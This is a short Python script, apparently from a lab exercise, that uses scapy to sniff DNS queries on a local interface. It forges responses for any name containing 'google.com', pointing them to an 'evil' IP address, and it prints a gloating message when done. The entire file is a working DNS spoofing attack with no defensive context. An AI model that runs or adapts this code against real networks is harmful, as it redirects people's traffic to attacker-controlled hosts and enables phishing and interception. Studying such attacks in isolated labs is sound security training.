from scapy import *
from scapy.layers.inet import IP, UDP, Ether
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.sendrecv import sniff, sendp, send

ethInterface = "enp0s8"
domain = "google.com"
evilIP = "192.168.75.3"


def process_packet(packet):
    # If the packet contains a dns request.
    if DNS in packet and packet[DNS].opcode == 0 and packet[DNS].ancount == 0:
        # If the dns request asks for google.com or any address that contains it.
        if domain in str(packet["DNS Question Record"].qname):
            print("Spoofing the target.")
            # Fake the ip address.
            ip = IP(src=packet[IP].dst, dst=packet[IP].src)
            # Fake the UDP ports.
            udp = UDP(sport=53, dport=packet[UDP].sport)
            # Build DNS with the required flags as a regular dig google.com uses.
            dns = DNS(id=packet[DNS].id, ancount=1, ra=1, qr=1, an=DNSRR(rrname=packet[DNSQR].qname, rdata=evilIP))
            # Build the DNSRR with our evil address instead of google.com
            dnsrr = DNSRR(rrname=packet[DNSQR].qname, rdata=evilIP)
            # Build the final packet.
            sendPacket = ip/udp/dns/dnsrr
            # Send the packet to the target.
            send(sendPacket)
            print("Spoofing completed. MUHAHA!")


# Sniff for DNS requests.
sniff(iface=ethInterface, filter="udp port 53", prn=process_packet)
